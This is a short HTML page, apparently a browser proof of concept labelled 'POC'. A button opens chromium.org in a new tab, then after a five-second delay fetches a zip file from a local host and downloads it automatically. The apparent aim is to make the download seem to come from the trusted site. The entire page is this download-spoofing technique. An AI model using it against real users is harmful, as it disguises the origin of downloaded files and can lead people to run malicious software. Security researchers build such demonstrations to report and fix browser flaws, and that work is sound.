<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download APK</title>

</head>

<body>
    <h1>Download APK insize ZIP</h1>


    <button onclick="startDownload()">Start Download Process</button>

    <script>
        async function startDownload() {
            window.open('https://chromium.org', '_blank');

            setTimeout(async () => {
                const response = await fetch('http://192.168.1.7:8000/Browser/filedownload.zip');
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = 'POC.zip';
                link.click();
                URL.revokeObjectURL(url);
            }, 5000);
        }
    </script>









</body>

</html>
